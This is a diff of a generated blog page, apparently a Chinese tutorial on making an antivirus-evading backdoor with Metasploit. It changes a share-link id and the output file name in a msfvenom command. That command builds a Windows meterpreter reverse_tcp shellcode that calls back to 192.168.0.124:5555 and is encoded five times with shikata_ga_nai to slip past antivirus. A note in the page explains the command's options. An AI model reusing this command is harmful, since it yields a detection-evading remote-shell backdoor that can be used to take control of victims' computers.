@@ -85,7 +85,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>①在kali中生成shellcode免杀</p>
-<p><code>msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.0.124 lport=5555 -f c -o /home/sha.c</code></p>
+<p><code>msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.0.124 lport=5555 -f c -o /home/test.c</code></p>
 <p><img src="/2019/02/01/利用metasploit生成免杀后门/kali.PNG" alt=""></p>
 <p><strong>注：-e：指定编码方式；-i：指定编码次数；-b：去除指定代码，一般是空代码或者是错误代码；-f：指定生成格式；-o：指定输出路径。</strong></p>
 <p>②执行上述代码之后，会生成test.c，路径为/home/test.c</p>
@@ -226,7 +226,7 @@ __asm
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjrmzc98o0000wov6a5xtq6p2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjrmzguqo0000l4v6405awjuw" class="article-share-link">Share</a>
       
       
     </footer>
